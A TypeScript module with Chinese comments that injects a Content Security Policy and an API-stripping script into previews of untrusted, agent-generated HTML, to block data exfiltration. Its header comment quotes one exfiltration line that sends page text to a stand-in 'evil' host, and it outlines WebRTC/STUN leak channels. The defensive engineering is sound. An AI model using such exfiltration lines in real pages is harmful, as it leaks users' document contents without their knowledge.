/**
 * 给 HTML 预览文档注入内容安全策略(CSP)。
 *
 * 为什么需要:预览的是 agent 产出、可能受提示注入影响的**不可信**文档,而渲染态要保留
 * JavaScript(设计稿的标签切换等交互依赖它)。而 `onShouldStartLoadWithRequest` **只管
 * 导航**,完全不经过子资源请求 —— 一段
 * `new Image().src = 'https://evil/?d=' + encodeURIComponent(document.body.innerText)`
 * 会在用户打开预览的那一刻静默把文档正文发出去,导航回调一无所知(review P1 实捉)。
 *
 * 所以出网必须由**渲染引擎强制**关闭,而不是靠我们在导航回调里约定。这里用 meta CSP
 * 关掉 CSP 管得到的全部出口:子资源、`fetch` / `XHR`、表单、iframe、插件。配套的另一半在
 * HtmlFileReader:顶层导航只放行 `about:`,连用户点击的外链也不外送。
 *
 * 代价(刻意接受,PR 已写明):公网 https 图片 / 字体 / 脚本在预览里**不再加载**。
 * 允许它们就等于留一条 `img-src https:` 的外传通道(`new Image().src='…?d=…'` 正是最经典的
 * 姿势),那会让上面整段封锁形同虚设。
 *
 * ── ⚠️ 残留信道:WebRTC(**不要把本模块说成「零出网」**) ────────────────────
 * `RTCPeerConnection` 的 ICE / STUN / DTLS 流量**不受 CSP 各 `*-src` 指令管辖** —— 恶意脚本
 * 可以把文档内容编码进 STUN 服务器域名,或直接与固定 peer 建数据通道外传,全程不经过导航
 * 回调、也不产生任何 CSP 管辖的 URL 请求(review P1 实捉)。本文件与 HtmlFileReader 早先的
 * 注释把这套封锁描述成绝对的,**那是错的**,已改;守卫用例禁止那类措辞回归。
 *
 * 已做的收窄:
 *  - `webrtc 'block'`(CSP3):Chromium 111+ 实现,Android System WebView 走 Chromium 内核、
 *    随 Play 商店更新,实机上基本都覆盖 → 那一侧是真封住的。**iOS 的 WKWebView 是 WebKit,
 *    尚未实现该指令,这条在 iOS 上无效**。未知指令被引擎忽略、不影响策略其余部分,所以加
 *    它没有副作用。
 *  - `mediaCapturePermissionGrantType="deny"`(见 HtmlFileReader):挡掉摄像头 / 麦克风取用。
 *    它**不能**关闭 WebRTC 外传 —— 纯数据通道与 STUN 候选收集都不需要媒体权限;这条是
 *    「不可信页面不该弹权限框」本身的正确做法,不要当成 WebRTC 的解。
 *
 * iOS 上要真正封死只有一条路:`javaScriptEnabled={false}`。那会让带交互的产物(标签切换、
 * 折叠、图表)退化成静态页 —— 属产品取舍,已在 PR 描述里显式提给放行人裁决,本层不擅自决定。
 *
 * 与「同目录资源透传」的关系(见 htmlLocalResources,栈上一层):资源一律以 `data:` URI
 * 内联、页面里不出现任何 bearer 凭证。那条路把被控端的文件内容带进页面,更需要这里的
 * 封锁 —— 但封锁本身属于「在 WebView 里渲染不可信 HTML」这件事,所以留在这一层。
 */

/** 预览文档的策略:默认全拒,只放行内联与 data: 资源,CSP 管得到的出口一律关闭。 */
export const HTML_PREVIEW_CSP = [
  "default-src 'none'",
  "img-src data:",
  "media-src data:",
  "font-src data:",
  "style-src 'unsafe-inline' data:",
  "script-src 'unsafe-inline' data:",
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
  "frame-src 'none'",
  "object-src 'none'",
  // Chromium 111+ 才实现(Android System WebView 覆盖,iOS WKWebView 无效);
  // 未知指令被忽略、不影响其余策略。残留面见头注的「WebRTC」一节。
  "webrtc 'block'",
].join('; ');

const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`;

/**
 * 设备与 WebRTC 面的剥离脚本 —— **必须是文档里第一段脚本**。
 *
 * ── 为什么用内联脚本而不是 WebView prop / native patch(review P0) ────────────
 * `mediaCapturePermissionGrantType="deny"` **只在 iOS 生效**:Android 侧
 * `RNCWebViewManager.java` 的 setter 是空函数(已在 node_modules 里核实
 * `setMediaCapturePermissionGrantType(RNCWebViewWrapper view, @Nullable String value) {}`),
 * 权限实际由 `RNCWebChromeClient.onPermissionRequest` 按 **app 级 OS 运行时权限**判定 ——
 * 用户为语音输入 / 拍照附件授过 `RECORD_AUDIO` / `CAMERA` 之后(常见状态),这个"离线沙箱"里
 * 的任意不可信 HTML 都能零提示拿到实时音视频流。react-native-webview 也没有暴露
 * `onPermissionRequest` 之类的回调可供拒绝。
 *
 * 两条备选都不划算:
 *  - **patch 原生**(`dependency-patches/react-native-webview@13.16.1.patch` 机制已在):改的是
 *    Android Java,会变动原生构建 → 触发冷更门,需要把关人对冷更单独确认,代价远大于本修复;
 *  - **`injectedJavaScriptBeforeContentLoaded`**:与解析赛跑(Android 靠 `onPageStarted` 触发),
 *    作者脚本可能先跑,是 mitigation 不是 fix。
 *
 * 而这段脚本拼在文档最前面,**由解析器保证先于任何作者脚本执行,没有竞态** —— 与 CSP meta
 * 同一个位置、同一个理由。它把能力面直接删掉,不依赖任何平台的权限实现是否正确。
 *
 * 作者脚本拿不到干净 realm 来恢复这些全局:CSP 里 `frame-src 'none'` 与 `object-src 'none'`
 * 已经封掉 iframe / object(用例钉住这两条与本脚本的共存关系)。属性用
 * `writable: false, configurable: false` 定死,重定义会抛。
 *
 * 顺带关掉的还有 **iOS 上的 WebRTC 残留信道**:`webrtc 'block'` 只有 Chromium 111+ 实现,
 * WKWebView 不认;`RTCPeerConnection` 一旦不存在,那条不受 CSP 管辖的外传路径也就没有了。
 * **这不改变「预览保留 JavaScript」这个已定的产品取舍** —— 脚本照旧执行,只是没有摄像头、
 * 麦克风与 WebRTC 这三样能力。
 *
 * ⚠️ 脚本文本里**不得出现 `</script>`**,否则会提前闭合(这里没有,用例钉住)。
 */
const DEVICE_SURFACE_GUARD = '<script>(function(){'
  + 'var hide=function(o,k){try{Object.defineProperty(o,k,'
  + '{value:undefined,writable:false,configurable:false});}catch(e){}};'
  + 'try{var N=Navigator.prototype;'
  // mediaDevices 是原型上的 getter:实例与原型都要盖掉,否则能沿原型链取回。
  + "hide(N,'mediaDevices');hide(navigator,'mediaDevices');"
  + "hide(N,'getUserMedia');hide(navigator,'getUserMedia');"
  + "hide(navigator,'webkitGetUserMedia');hide(navigator,'mozGetUserMedia');"
  + "hide(window,'RTCPeerConnection');hide(window,'webkitRTCPeerConnection');"
  + "hide(window,'RTCDataChannel');"
  + '}catch(e){}})();</scr' + 'ipt>';

/** 我们自己的前导段:标准模式 + 策略 + 能力剥离,一次性拼在最前面。 */
const CSP_PROLOG = `<!doctype html>${CSP_META}${DEVICE_SURFACE_GUARD}`;

/**
 * 给文档加上 CSP。**不去定位作者写在哪的 doctype —— 自己前置一个。**
 *
 * ── 为什么改成这样(root cause,别再"优化"回定位方案) ──────────────────────
 * 原实现试图找到作者的 doctype、把 meta 插在它后面(为了不让文档掉进 quirks mode)。
 * 那条路要求我们**用手写扫描去解析 HTML 前导段**,而前导段能出现的 token 是开放集合:
 * 空白、BOM、`<!-- -->`、`<?xml ?>` / `<?php ?>` 等处理指令、CDATA…… review 因此连挖三轮
 * (紧贴开头 → 前导注释 → 处理指令),每补一个 token 就还剩下一个。这不是边界没修够,
 * 是**方法错**:定位作者 doctype 需要真正的 HTML 前导解析器,不该在业务代码里手写。
 *
 * 现在把问题消掉而不是解决它:**总是自己前置 `<!doctype html>` + CSP meta**,原文整份跟在
 * 后面一字不动。于是「插在哪」不存在,上面那一整类 token 也不需要认识:
 *  - 原文自带 doctype → 解析器先见我们的、已进标准模式;原文那个按 HTML 规范在
 *    "in body" 插入模式被忽略(parse error, ignore the token),无副作用;
 *  - 原文以 `<?xml ?>` / `<?php ?>` / 注释 / CDATA 开头 → 它们照旧变 bogus comment,
 *    与不加策略时的解析结果一致;
 *  - 策略仍在**任何作者内容之前**生效 —— 这是 meta CSP 唯一安全的位置(见下)。
 * 唯一需要单独处理的是 BOM:必须前移到我们的前导段之前,否则会变成文档中间的游离字符。
 *
 * ⚠️ 仍然**刻意不去找 `<head>`**(review P1,两个 bot 各报过一次):找 `<head>` 的正则会
 * 命中注释里的假标签(`<!-- <head> -->`),CSP 被插进注释、策略整份失效;即使命中真的
 * `<head>`,它**之前**的内容(浏览器会照常执行前置 `<script>`)仍在策略生效前跑。
 *
 * 已知代价(刻意接受):**原本没有 doctype、依赖 quirks mode 排版的产物会变成标准模式。**
 * agent 生成的 HTML 基本都自带 `<!doctype html>`;而 quirks 模式的排版差异远小于「策略没生效」
 * 或「整份掉进 quirks」这两种旧失败模式。
 */
export function withHtmlPreviewCsp(html: string): string {
  // BOM 前移:它必须留在文档最前面,否则会成为游离字符。
  if (html.charCodeAt(0) === 0xfeff) return `\uFEFF${CSP_PROLOG}${html.slice(1)}`;
  return `${CSP_PROLOG}${html}`;
}
